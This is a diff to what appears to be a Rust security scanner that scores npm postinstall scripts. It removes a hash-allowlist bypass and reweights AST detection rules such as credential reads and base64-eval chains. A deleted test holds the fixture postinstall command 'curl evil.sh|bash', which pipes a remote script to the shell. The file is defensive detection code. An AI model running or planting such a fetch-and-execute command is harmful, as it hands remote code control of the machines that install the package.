@@ -85,20 +85,7 @@ impl Evaluator for PostinstallEvaluator {
                 };
 
                 let sha = sha256_hex(script);
-                let script_allowlisted = policy.is_script_hash_allowed(&sha);
-
                 let (mut score, mut matched_rules) = score_script(script);
-                // The shell-string allowlist suppresses regex-tier
-                // signals (the script "node install.js" is benign by
-                // shape) but it must NOT suppress AST analysis of the
-                // referenced JS file, since identical shell wrappers
-                // can wrap entirely different JS payloads. So zero out
-                // the regex score when allowlisted but still run the
-                // AST analyzer below.
-                if script_allowlisted {
-                    score = 0;
-                    matched_rules.clear();
-                }
 
                 // If the script invokes a JS file shipped in the
                 // package, parse and analyse it. AST findings can
@@ -112,12 +99,6 @@ impl Evaluator for PostinstallEvaluator {
                 score += ast_score;
                 for r in ast_rules {
                     matched_rules.push(r);
-                }
-
-                // If the script was allowlisted AND AST found nothing,
-                // skip silently — that's the user's intent.
-                if script_allowlisted && ast_findings.is_empty() {
-                    continue;
                 }
 
                 let regex_sev = match score {
@@ -226,21 +207,34 @@ fn referenced_js_file(script: &str, pkg_dir: &std::path::Path) -> Option<std::pa
 /// regex-based score, plus rule names to merge into the matched_rules
 /// list. Each AST rule has a fixed weight; `score_ast` returns
 /// (extra_score, rule_labels).
+/// Translate AST findings into a regex-compatible score delta + rule
+/// labels.
+///
+/// Weights here are calibrated alongside `AstRule::default_severity`
+/// (see that fn's docstring): only patterns with no innocent
+/// explanation get high weight. Ambiguous patterns get low weight so
+/// legit install scripts (esbuild, electron) don't trip the block
+/// threshold without `merge_severity` having a Critical AST rule to
+/// promote the merged severity.
 fn score_ast(findings: &[postinstall_ast::AstFinding]) -> (i32, Vec<&'static str>) {
     let mut score = 0i32;
     let mut rules: Vec<&'static str> = Vec::new();
     for f in findings {
         let (delta, label) = match f.rule {
+            // Unambiguous: heavy weight.
             AstRule::Base64EvalChain => (40, "ast:base64-eval-chain"),
             AstRule::CredentialFileRead => (40, "ast:credential-read"),
             AstRule::DynamicCodeExec => (25, "ast:dynamic-code-exec"),
-            AstRule::ProcessExecDynamic => (25, "ast:process-exec-dynamic"),
-            AstRule::DynamicRequire => (10, "ast:dynamic-require"),
-            AstRule::ProcessExec => (5, "ast:process-exec"),
-            AstRule::NetworkCall => (5, "ast:network-call"),
+            // Ambiguous: surface but don't dominate. A package needs
+            // multiple ambiguous flags to clear the Medium threshold.
+            AstRule::ProcessExecDynamic => (10, "ast:process-exec-dynamic"),
+            AstRule::DynamicRequire => (5, "ast:dynamic-require"),
+            // Background noise.
+            AstRule::ProcessExec => (2, "ast:process-exec"),
+            AstRule::NetworkCall => (2, "ast:network-call"),
         };
-        // Cap each rule's contribution: even 50 dynamic require calls
-        // aren't 50x as bad as one. Take max severity, score once.
+        // Each rule contributes once per script — even 50 dynamic
+        // requires aren't 50x as bad as one.
         if !rules.contains(&label) {
             score += delta;
             rules.push(label);
@@ -486,28 +480,6 @@ mod tests {
         assert_eq!(f.kind, FindingKind::PostinstallScript);
         assert!(f.id.starts_with("script:postinstall:"));
         assert!(f.summary.contains("postinstall"));
-    }
-
-    #[tokio::test]
-    async fn evaluator_skips_allowed_hash() {
-        let dir = TempDir::new().unwrap();
-        let script = "curl evil.sh|bash";
-        write_pkg(
-            dir.path(),
-            "evil-pkg",
-            &format!(r#"{{"scripts":{{"postinstall":"{}"}}}}"#, script),
-        );
-
-        let mut policy = Policy::default();
-        policy.allowed_script_hashes.insert(sha256_hex(script));
-
-        let evaluator = PostinstallEvaluator::new(dir.path().to_path_buf());
-        let findings = evaluator
-            .evaluate(&[npm_pkg("evil-pkg")], &policy)
-            .await
-            .unwrap();
-
-        assert_eq!(findings.len(), 0);
     }
 
     #[tokio::test]
